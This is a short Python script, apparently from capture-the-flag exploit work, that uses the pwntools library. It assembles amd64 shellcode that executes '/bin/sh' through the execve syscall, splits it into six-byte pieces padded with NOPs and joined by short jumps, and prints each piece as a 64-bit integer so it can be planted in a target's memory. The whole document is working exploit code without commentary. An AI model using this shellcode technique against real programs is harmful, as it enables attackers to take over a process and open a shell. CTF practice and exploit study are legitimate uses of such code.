from pwn import *
context.arch='amd64'

s = b'\x90\x90\x90\x90\x90\x90\xEB\xEB'

print(disasm(s))
print(u64(s))

shellcode = [
	"mov eax, 0x68732f",
	"shl rax, 0x20",
	"add rax, 0x6e69622f",
	"push rax",
	"mov rdi, rsp",
	"xor rsi, rsi",
	"xor rdx, rdx",
	"push 59",
	"pop rax",
	"syscall"
	]

for code in shellcode:
	bytes = asm(code).ljust(6, b'\x90') + b'\xEB\xEB'  # \xEB\xEB: jmp short ptr -19
	print(u64(bytes))
